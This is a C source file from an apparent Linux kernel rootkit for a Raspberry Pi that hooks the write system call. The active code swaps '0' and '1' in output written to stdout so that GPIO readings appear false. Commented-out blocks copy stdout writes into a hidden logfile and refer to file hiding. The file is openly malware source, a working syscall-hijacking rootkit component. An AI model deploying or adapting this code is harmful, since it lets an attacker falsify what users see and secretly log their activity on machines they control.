#include<linux/slab.h>		// for kmalloc
#include <linux/uaccess.h> 	// for copy_from_user
#include <linux/unistd.h>	// for __NR_getdents64 & __NR_getdents
#include <linux/delay.h>	// for msleep
#include <linux/fs.h> 		// for flip_open	

#include "hack_pi.h"
#include "write_hooking.h"
#include "open_hooking.h"
#include "read_hooking.h"
#include "gpio_hijacking.h"	// for CheckGPIOIsOutput

#define FILES_VISIBLE 0
#define FILES_HIDDEN 1

// Function pointers to original syscalls
asmlinkage ssize_t (*original_write)(int fd, char *buf, size_t count);

asmlinkage ssize_t hacked_write(int fd, char *buf, size_t count)
{
	int ret = original_write(fd, buf, count);
	char *needle_ptr = buf;
	//struct file *file;
	//mm_segment_t old_fs;
	//loff_t pos = 0;


	//char *command_to_find = "echotest";//"echoout>/sys/class/gpio/gpio4/direction";
	//bool exported = false;
	
	//if(CheckGPIOIsOutput(4)){	// if GPIO 4 is exported, start hijacking output written
	if(HOOK_WRITE){	// if cat /sys/class/gpio/gpio4/value is called, hack the output
		
		if(*needle_ptr=='0' && *(needle_ptr+1)=='\n' && fd==1) { //&& exported==true) {
			printk("In case 1\n");
			needle_ptr[0]='1';
			original_write(fd, needle_ptr, 2);
			return count;
		}
		else if (*needle_ptr=='1' && *(needle_ptr+1)=='\n' && fd==1) { //&& exported==true) {
			printk("In case 2\n");
			needle_ptr[0]='0';		
			original_write(fd, needle_ptr, 2);
			return count;
		}
		HOOK_WRITE=false;
	}
	/*
	if(IS_COMMAND && fd==1){	// if user pressed enter
		
		struct file *file;
		mm_segment_t old_fs;
		loff_t pos = 0;
	
		old_fs = get_fs();
		set_fs(KERNEL_DS);

		//disable_file_hiding();
		file = filp_open("/home/pi/rootkit_logfile", O_RDWR|O_APPEND|O_CREAT, 0644);

		if(IS_ERR(file)){
			//printk("CREATE FILE ERROR %d...\n", ERR_PTR(file));
			//return -1;
		}
		else{
			if(file && ret>0){
				
				pos=0;
				vfs_write(file, buf, strlen(buf), &pos);								
				printk("Copying from user sys_write: %s...\n\n", buf);		
				filp_close(file, NULL);
				//enable_file_hiding();
			}else{
				if(!file)
					printk("OPEN FILE ERROR 111...\n");
				else if(ret<=0)
					printk("OPEN FILE ERROR 222...\n");
			}
		}
		set_fs(old_fs);
		

		IS_COMMAND=false;
	}*/

/*	if(fd==1){

		old_fs = get_fs();
		set_fs(KERNEL_DS);
	
		file = filp_open("/home/pi/rootkit_logfile", O_RDWR|O_APPEND|O_CREAT, 0644);
	
		if(IS_ERR(file)){
			//printk("CREATE FILE ERROR %d...\n", ERR_PTR(file));
			//return -1;
		}
		else{
			if(file && ret>0){
					pos=0;
					vfs_write(file, buf, strlen(buf), &pos);
					//vfs_write(file, test_buffer, strlen(test_buffer), &pos);								
					printk("Copying from user...\n\n");		
		
				filp_close(file, NULL);
			}else{
				if(!file)
					printk("OPEN FILE ERROR 111...\n");
				else if(ret<=0)
					printk("OPEN FILE ERROR 222...\n");
			}
		}
		set_fs(old_fs);
	}*/
	return ret;
}

void enable_write_hooking(void)
{
	
	printk("Enable write hooking...");
	// Hook system calls to our function
	HOOK_SYSCALL(write);

}

void disable_write_hooking(void)
{
	RESTORE_SYSCALL(write);
}

void init_write_hooking(void)
{
	printk("Init Write hooking...");	
	enable_write_hooking();
}

void finalize_write_hooking(void)
{
	disable_write_hooking();
}
